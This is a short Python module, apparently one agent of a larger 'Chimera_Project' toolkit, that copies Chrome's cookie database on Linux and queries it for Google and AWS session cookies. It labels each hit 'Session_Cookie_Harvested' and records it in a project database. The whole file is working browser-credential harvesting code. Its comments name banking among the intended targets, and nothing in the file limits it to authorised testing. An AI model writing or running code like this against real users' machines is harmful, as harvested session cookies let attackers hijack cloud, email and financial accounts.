import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import sqlite3
import shutil
import logging

# GPS Line
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Cookie_Squeezer:
    def __init__(self):
        self.agent_id = "83"
        self.name = "Cookie_Squeezer"
        self.db = ChimeraDB()
        # Common path for Chrome on Linux
        self.cookie_path = os.path.expanduser("~/.config/google-chrome/Default/Cookies")

    def squeeze(self):
        """Copies the locked cookie database and queries for active sessions."""
        if not os.path.exists(self.cookie_path):
            self.logger.info("Chrome cookies not found at default location.")
            return

        # We must copy it because Chrome locks the file while running
        temp_db = "/tmp/ck_temp"
        try:
            shutil.copyfile(self.cookie_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Querying for sensitive domains (Google, AWS, Banking)
            cursor.execute("SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%aws%'")
            
            findings = cursor.fetchall()
            for host, name, value in findings:
                self.db.report_finding(self.name, "Session_Cookie_Harvested", {
                    "domain": host,
                    "cookie_name": name
                })
            
            self.logger.warning(f"[!] Squeezed {len(findings)} sensitive session cookies.")
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            self.logger.error(f"Cookie extraction failed: {e}")

    def run(self):
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO)
        self.logger = logging.getLogger(self.name)
        
        self.db.heartbeat(self.name)
        self.squeeze()
        self.db.close()

if __name__ == "__main__":
    agent = Cookie_Squeezer()
    agent.run()
